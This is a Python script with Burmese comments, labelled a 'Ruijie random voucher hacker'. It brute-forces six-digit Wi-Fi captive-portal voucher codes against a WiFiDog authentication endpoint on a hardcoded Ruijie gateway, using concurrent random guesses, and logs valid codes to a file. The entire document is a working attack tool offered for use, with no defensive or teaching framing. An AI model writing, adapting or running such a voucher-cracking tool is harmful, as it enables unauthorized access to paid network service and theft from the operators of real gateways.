import sys, os, asyncio, aiohttp, random
from colorama import Fore, init

init(autoreset=True)

# အစ်ကို့ Canary အချက်အလက်များ
TARGET_IP = "192.168.110.1"
GW_ID = "58b4bbd9c1e9"
GW_SN = "H1U42FJ004707"

FOUND_VOUCHERS = []

async def check_voucher(session, v):
    global FOUND_VOUCHERS
    url = f"http://{TARGET_IP}:2060/wifidog/auth"
    params = {"token": v, "gw_id": GW_ID, "gw_sn": GW_SN}
    try:
        async with session.get(url, params=params, timeout=0.8) as res:
            text = await res.text()
            if "success" in text.lower() or res.status == 302:
                if v not in FOUND_VOUCHERS:
                    FOUND_VOUCHERS.append(v)
                    with open("found_vouchers.txt", "a") as f:
                        f.write(f"{v}\n")
    except:
        pass

async def start_cracking():
    os.system('clear')
    print(f"{Fore.MAGENTA}========================================")
    print(f"{Fore.WHITE}   RUIJIE RANDOM VOUCHER HACKER")
    print(f"{Fore.MAGENTA}========================================\n")

    async with aiohttp.ClientSession() as session:
        while True:
            # ကျပန်း (Random) ဂဏန်း ၆ လုံး ၅ ခု ထုတ်မယ်
            v_list = [str(random.randint(100000, 999999)) for _ in range(5)]
            
            # အစ်ကိုလိုချင်တဲ့အတိုင်း ဘေးတိုက် တန်းစီပြမယ်
            # ဥပမာ - 364868  364748  123456 ...
            scan_display = "  ".join([f"{Fore.YELLOW}{c}" for c in v_list])
            sys.stdout.write(f"\r{Fore.CYAN}[SCAN] {scan_display}")
            sys.stdout.flush()

            # အမှန်တွေ့ရင် အပေါ်ကနေ 364767 463758 ဆိုပြီး တန်းပေါ်လာမယ်
            if FOUND_VOUCHERS:
                valid_display = " ".join([f"{Fore.GREEN}{c}" for c in FOUND_VOUCHERS])
                sys.stdout.write("\033[K")
                print(f"\n{Fore.GREEN}[FOUND] {valid_display}\033[F")

            # အပြိုင်အဆိုင် စစ်မယ်
            tasks = [check_voucher(session, v) for v in v_list]
            await asyncio.gather(*tasks)
            
            await asyncio.sleep(0.01)

if __name__ == "__main__":
    try:
        asyncio.run(start_cracking())
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Stopped.")
